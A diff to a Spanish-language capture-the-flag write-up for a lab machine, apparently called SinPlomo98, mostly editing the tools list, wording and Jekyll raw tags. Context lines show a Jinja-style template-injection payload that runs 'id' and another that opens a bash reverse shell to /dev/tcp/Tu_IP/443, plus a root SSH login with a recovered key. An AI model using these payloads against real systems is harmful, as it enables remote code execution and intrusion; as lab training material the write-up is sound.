@@ -34,6 +34,7 @@ Esta es una máquina algo compleja. Después de analizar los escaneos, descubrim
 Herramientas utilizadas:
 * *ping*
 * *nmap*
+* *ftp*
 * *wappalizer*
 * *wfuzz*
 * *gobuster*
@@ -41,7 +42,8 @@ Herramientas utilizadas:
 * *id*
 * *Python3*
 * *wget*
-* *linPEAS*
+* *linpeas.sh*
+* *tail*
 * *df*
 * *debugfs*
 * *cat*
@@ -275,7 +277,7 @@ Veamos qué contiene el archivo:
 cat supermegaultraimportantebro.txt
 Gracias por venir, ahora vayase!!
 ```
-No pues nada, parece que caimos en un **Rabit Hole**.
+No pues nada útil.
 
 Vayamos a ver la página web del **puerto 80**.
 
@@ -477,10 +479,13 @@ Aquí te dejo un par de blogs que muestran payloads para probar y explotar esta 
 
 Vamos a probar si ejecuta una multiplicación como dice el blog.
 
-Prueba esto:
+Prueba esto en el input:
+
+{% raw %}
 ```bash
 {{ 4*2 }}
 ```
+{% endraw %}
 
 <p align="center">
 <img src="/assets/images/THL-writeup-sinPlomo98/Captura11.png">
@@ -490,10 +495,13 @@ Funciona, se ejecuta la multiplicación.
 
 Vamos a probar si podemos ejecutar comandos, así que tratemos de ejecutar **id**.
 
-Prueba esto:
+Prueba esto en el input:
+
+{% raw %}
 ```bash
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
 ```
+{% endraw %}
 
 <p align="center">
 <img src="/assets/images/THL-writeup-sinPlomo98/Captura12.png">
@@ -510,9 +518,12 @@ listening on [any] 443 ...
 ```
 
 Prueba esta **Reverse Shell** y ejecútala:
+
+{% raw %}
 ```bash
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen("bash -c 'bash -i >& /dev/tcp/Tu_IP/443 0>&1'").read() }}
 ```
+{% endraw %}
 
 Observa la **netcat**
 ```bash
@@ -753,7 +764,7 @@ Muy bien, tenemos la frase de la llave privada.
 
 Vamos a loguearnos en la máquina víctima como **Root** al **servicio SSH**, usando la llave privada y la frase:
 ```bash
-ssh -i id_rsa root@192.168.100.60
+ssh -i id_rsa root@192.168.10.20
 Enter passphrase for key 'id_rsa': 
 Linux SinPLomo98 6.1.0-21-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03) x86_64
 Last login: Thu May 16 16:49:15 2024
